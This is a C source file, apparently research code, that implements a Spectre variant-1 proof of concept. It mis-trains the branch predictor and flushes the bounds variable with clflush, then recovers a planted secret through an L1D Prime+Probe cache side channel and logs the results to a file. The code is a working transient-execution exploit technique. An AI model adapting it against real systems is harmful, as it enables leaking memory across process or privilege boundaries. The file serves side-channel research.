#include "../include/cell.h"

#define ARRAY2_SIZE 32768

/* Secret variable to spy */
char secret = '\0';

int global_align_4096 __attribute__ ((aligned(4096)));
unsigned char array1[16] = {0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15};
unsigned char array1_size = 16;
unsigned char * array2 = NULL;

/*
 * Spectre PoC code
*/
void
spectre(unsigned long spy_x){
	int local_align_4096 __attribute__ ((aligned(4096)));
	unsigned char dummy = (unsigned char) 0x1;
	unsigned long x;
	/* Select a legal index to access array1 and mis-train the branch predictor */
	unsigned long good_x = rand() % 16;
	/* Prepare the L1D_cache */
	prime_L1D_cache();
	/* Training session */
	for(int train = 1; train <= 30; train++){
		/* Flush the index barrier for array1 from the entire cache hierarchy */
		clflush((void *) &array1_size);
		/* Wait until the 'clflush' instruction to complete with a for loop */
		for(int z = 0; z < 100; z++){}
		/* Training process from the Spectre PoC */
		x = ((train % 6) - 1) & ~0xF;
		x = (x | (x >> 4));
		x = good_x ^ (x & (spy_x ^ good_x));
		if(x < array1_size)
			dummy &= array2[array1[x] * L1_SETS];
	}
	/* Probe the entire L1D cache and save the results to the 'spectre.dat' file */
	probe_L1D_cache();
}

int main(){
	/* Seed RNG */
	srand(time(NULL));
	/* Create Attack table */
	create_U();
	/* Allocate 'Array2', originally described in the PoC of Spectre */
	posix_memalign(&array2, 4096, sizeof(unsigned char) * ARRAY2_SIZE);
	if(array2 == NULL)
		return -1;
	/* Fill array2 with 1's */
	for(int i = 0; i < ARRAY2_SIZE; i++)
		array2[i] = (unsigned char) 0x1;
	/* Calculate the offset between 'array1' and the secret variable */
	unsigned long spy_x = (unsigned long)(&secret - (char *)array1);
	/* Open output file spectre.dat */
	open_output_file();
	/* Perform 64 rounds of Prime+Probe for the entire L1D Cache */
	for(int i = 0; i < L1_SETS; i++){
		secret = (char) i;
		spectre(spy_x);
	}
	destroy_U();
	/* Close Results File */
	close_output_file();
}
